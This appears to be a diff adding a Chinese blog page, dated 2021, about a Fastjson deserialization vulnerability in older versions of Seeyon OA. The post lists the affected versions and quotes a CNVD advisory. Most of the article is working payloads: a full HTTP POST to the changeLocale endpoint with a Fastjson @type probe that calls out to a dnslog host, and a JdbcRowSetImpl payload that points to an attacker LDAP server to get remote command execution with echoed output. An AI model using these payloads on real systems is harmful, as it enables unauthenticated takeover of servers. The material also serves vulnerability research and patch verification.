@@ -1,0 +1,294 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="影响版本： 12345V7.1、V7.1SP1V7.0、V7.0SP1、V7.0SP2、V7.0SP3V6.1、V6.1SP1、V6.1SP2V6.0、V6.0SP1V5.6、V5.6SP1 CNVD在四月发的风险提示：影响8.0以下版本：   1致远OA软件旧版本（V8.0以下，V8.0于2020年6月11日发布）集成的Fastjson组件存在反序列化漏洞。Fastjson是阿里巴巴公司研发的一">
+<meta property="og:type" content="article">
+<meta property="og:title" content="致远Oa_fastjson反序列化">
+<meta property="og:url" content="https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
+<meta property="og:site_name" content="xwuyi&#39;s blog">
+<meta property="og:description" content="影响版本： 12345V7.1、V7.1SP1V7.0、V7.0SP1、V7.0SP2、V7.0SP3V6.1、V6.1SP1、V6.1SP2V6.0、V6.0SP1V5.6、V5.6SP1 CNVD在四月发的风险提示：影响8.0以下版本：   1致远OA软件旧版本（V8.0以下，V8.0于2020年6月11日发布）集成的Fastjson组件存在反序列化漏洞。Fastjson是阿里巴巴公司研发的一">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://xwuyi.com/images/pasted-153.png">
+<meta property="article:published_time" content="2021-07-02T02:49:36.000Z">
+<meta property="article:modified_time" content="2021-07-02T03:07:16.802Z">
+<meta property="article:author" content="xwuyi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://xwuyi.com/images/pasted-153.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>致远Oa_fastjson反序列化</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/true" title="xwuyi&#39;s blog" type="application/atom+xml" />
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2021/02/17/ms17010%E6%BC%8F%E6%B4%9E%E6%8E%A2%E6%B5%8B%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9%E7%89%88/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=致远Oa_fastjson反序列化"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=致远Oa_fastjson反序列化"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=致远Oa_fastjson反序列化&body=Check out this article: https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=致远Oa_fastjson反序列化&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=致远Oa_fastjson反序列化"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        致远Oa_fastjson反序列化
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">xwuyi</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2021-07-02T02:49:36.000Z" itemprop="datePublished">2021-07-02</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <p>影响版本：</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">V7<span class="number">.1</span>、V7<span class="number">.1</span>SP1</span><br><span class="line">V7<span class="number">.0</span>、V7<span class="number">.0</span>SP1、V7<span class="number">.0</span>SP2、V7<span class="number">.0</span>SP3</span><br><span class="line">V6<span class="number">.1</span>、V6<span class="number">.1</span>SP1、V6<span class="number">.1</span>SP2</span><br><span class="line">V6<span class="number">.0</span>、V6<span class="number">.0</span>SP1</span><br><span class="line">V5<span class="number">.6</span>、V5<span class="number">.6</span>SP1</span><br></pre></td></tr></table></figure>
+<p>CNVD在四月发的风险提示：影响8.0以下版本：  </p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">致远OA软件旧版本（V8<span class="number">.0</span>以下，V8<span class="number">.0</span>于<span class="number">2020</span>年<span class="number">6</span>月<span class="number">11</span>日发布）集成的Fastjson组件存在反序列化漏洞。Fastjson是阿里巴巴公司研发的一款开源JSON解析库，支持Java对象至JSON字符串之间的格式转换。未经身份验证的攻击者利用上述漏洞，可通过发送精心构造的恶意网络请求，获取目标服务器权限，实现服务器的远程代码执行。致远公司已于<span class="number">2020</span>年<span class="number">6</span>月<span class="number">11</span>日完成对集成Fastjon组件的漏洞修复，并在V8<span class="number">.0</span>版本之后移除该组件。</span><br></pre></td></tr></table></figure>
+<p>测试了一部分，修复补丁应该是将fastjson的链加黑名单里了。<br>dnslog测试poc：        </p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/seeyon/main.do?method=changeLocale</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: xxx</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 71</span><br><span class="line"></span><br><span class="line">_json_params=&#123;"@type":"java.net.Inet4Address","val":"xxx.dnslog.cn"&#125;</span><br></pre></td></tr></table></figure>
+<p>如果目标出网，dnslog会收到回连请求，但不一定能执行命令。<br>命令执行回显：  </p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.rowset.JdbcRowSetImpl"</span>,<span class="attr">"dataSourceName"</span>:<span class="string">"ldap://xxxxx/Basic/TomcatEcho"</span>,<span class="attr">"autoCommit"</span>:<span class="literal">true</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/pasted-153.png" alt="upload successful"></p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&text=致远Oa_fastjson反序列化"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&is_video=false&description=致远Oa_fastjson反序列化"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=致远Oa_fastjson反序列化&body=Check out this article: https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&title=致远Oa_fastjson反序列化"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&name=致远Oa_fastjson反序列化&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://xwuyi.com/2021/07/02/%E8%87%B4%E8%BF%9Coa-fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/&t=致远Oa_fastjson反序列化"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2019-2021
+    xwuyi
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/">首页</a></li>
+         
+          <li><a href="/archives/">归档</a></li>
+         
+          <li><a href="/about/">关于</a></li>
+        
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+
+<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+
+
+    <!-- jquery -->
+
+<script src="/lib/jquery/jquery.min.js"></script>
+
+
+<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
+
+<!-- clipboard -->
+
+  
+<script src="/lib/clipboard/clipboard.min.js"></script>
+
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"复制到粘贴板!\">";
+    btn += '<i class="far fa-clone"></i>';
+    btn += '</span>'; 
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "复制成功!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Google Analytics -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Umami Analytics -->
+
+<!-- Disqus Comments -->
+
+
+</body>
+</html>
